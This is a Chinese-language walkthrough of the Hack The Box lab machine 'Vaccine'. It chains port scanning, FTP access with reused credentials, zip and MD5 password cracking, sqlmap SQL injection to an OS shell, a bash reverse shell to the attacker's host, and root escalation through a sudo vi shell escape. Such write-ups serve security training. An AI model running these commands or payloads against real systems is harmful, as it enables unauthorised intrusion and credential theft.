# Vaccine
###### tags: `HTB_Starting Point`

1. Enumeration(枚舉)
* Port scan
```
sudo nmap -sC -sV -oA /nmap/Vaccine 10.10.10.46
```
-sC：equivalent to --script=default
-sV：Probe open ports to determine service/version info
-oA：Output in the three major formats at once
![](https://i.imgur.com/atSOpuf.png)

* Discover 80 Port
打開瀏覽器以及Burp suite似乎沒有發現什麼有趣的東西
![](https://i.imgur.com/syOfW6s.png)
* 嘗試一下dirsearch，看有沒有隱藏的子目錄
```
sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.46 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50
```
![](https://i.imgur.com/NF8iwld.png)

* Discover 22 Port
在執行dirsearch時，要等待較久。可以嘗試使用我們在上一台靶機獲得的帳號資訊登入FTP(ftpuser : mc@F1l3ZilL4)
```
ftp 10.10.10.46
```
![](https://i.imgur.com/skzdeKT.png)
* 發現一個名為backup.zip的檔案，我們把它載到本機端
```
ls
get backup.zip
```
![](https://i.imgur.com/VkxEjjf.png)
* 嘗試解壓縮該檔案，但是很不幸的是需要密碼才能解壓縮該檔案
```
unzip backup.zip
```
![](https://i.imgur.com/0TK7SC2.png)
* 使用zip2john並獲取其哈希值。
```
sudo zip2john backup.zip > hash.txt
```
* 再使用john之前我們需要先解壓縮rockyou.txt這個字典檔
```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```
* 使用john進行破解，希望能夠順利取得密碼
```
john hash.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
john --show hash.txt
```
![](https://i.imgur.com/Dn38oQn.png)
* 再解壓一次backup.zip(password=741852963)
```
unzip backup.zip
```
![](https://i.imgur.com/YRmn3CU.png)
* 在index.php中我們可以發現，有個amdin帳號，其密碼似乎用md5加密
```
cat index.php
```
![](https://i.imgur.com/Qx0OYHd.png)
* 使用[crackstation](https://crackstation.net/)，解密一下

![](https://i.imgur.com/2UDR6dB.png)
* admin : qwerty789
* 還記得剛剛web的登入介面嗎? 我們拿剛剛獲得的帳密試試看!

![](https://i.imgur.com/0Auk7bt.png)
* 最後，我們在此網站上只有搜索選項的功能。嘗試啟動Burp Suite並檢查正在處理的請求是什麼

![](https://i.imgur.com/TzAYFG9.png)
看來只有sql injection這條路了!
2. Foothold(立足點)
* [SQL injection ](https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d)
```
sudo sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=6r7ts035jpr9s4ugkh3q2tqvq2 --dbs --batch
```
![](https://i.imgur.com/0mKaoJh.png)
* 查看輸出時，我們可以看到有3個主要數據庫。您可以枚舉所有表並從數據庫中獲取數據。

![](https://i.imgur.com/tTVRau1.png)
* 獲得使用者shell
使用SQLMap的--os-shell 指令
枚舉所有Table
```
sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=6r7ts035jpr9s4ugkh3q2tqvq2 --os-shell --batch
```
![](https://i.imgur.com/eZ8VAmn.png)
* 升級shell
```
sudo nc -lvnp 4848
bash -c 'bash -i &>/dev/tcp/10.10.14.6/4848 <&1' &
```

![](https://i.imgur.com/YWJQ6kk.png)

![](https://i.imgur.com/ElVBJRQ.png)
* 我們需要枚舉數據庫並查找用戶和密碼
```
sudo sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=6r7ts035jpr9s4ugkh3q2tqvq2 --batch --passwords
```
![](https://i.imgur.com/Ype92J1.png)

* Get !!! postgres :P@s5w0rd!

![](https://i.imgur.com/nOntdbz.png)

3. 提權
* 使用SSH登入目標主機
```
su root
ssh postgres@10.10.10.46
```
![](https://i.imgur.com/ffh0Rfv.png)
* 用戶可以列出/etc/passwd但不能列出/etc/sudoers

![](https://i.imgur.com/A7rqbw8.png)

* 使用id查看
```
id
```
![](https://i.imgur.com/YX998FN.png)
* checking sudo -l reference to this [Tips!](https://unix.stackexchange.com/questions/87114/how-do-i-know-a-specified-users-permissions-on-linux-with-root-access)
```
sudo -l
```
![](https://i.imgur.com/0mqeIQQ.png)
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
* 會打開圖下檔案，檔案上的內容完全沒有關係。因為我們使用VI提權漏洞，可以運行該漏洞利用程序。(按Ese，Ctrl+:，!/bin/bash)
![](https://i.imgur.com/myx4VWE.png)
* 提權成功!
```
whoami
cat /root/root.txt
```
![](https://i.imgur.com/xtvklF2.png)
